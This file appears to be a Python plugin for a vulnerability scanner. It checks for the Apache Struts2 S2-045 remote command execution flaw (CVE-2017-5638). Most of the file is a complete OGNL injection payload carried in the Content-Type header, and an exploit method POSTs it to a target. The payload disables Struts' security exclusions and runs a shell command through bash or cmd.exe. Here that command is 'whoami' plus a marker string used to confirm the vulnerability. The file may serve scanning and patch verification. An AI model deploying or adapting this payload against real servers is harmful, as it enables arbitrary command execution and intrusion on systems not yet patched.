#!/usr/bin/env python
#coding:utf8

__author__ = 'xiaokong'

from module.plugin import Plugin

class poc(Plugin):
    
    type = 'FRAME'
    querytype = 'site'
    description = 'Struts2-045 remote command execute(CVE-2017-5638)'
    
    def __init__(self):
    
        self.payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):\
    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))\
    .(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami&&echo 13923fd34fcv4200').\
    (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))\
    .(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse()\
    .getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

        
    def exploit(self, target):
        
        headers = {'Content-Type': self.payload}
        response = self.query(method='POST', url=target, headers=headers)
        if response is not None:
            if response.ok:
                if '13923fd34fcv4200' in response.content and "context.setMemberAccess" not in response.content:
                    self.log.vuln(target)
    

   



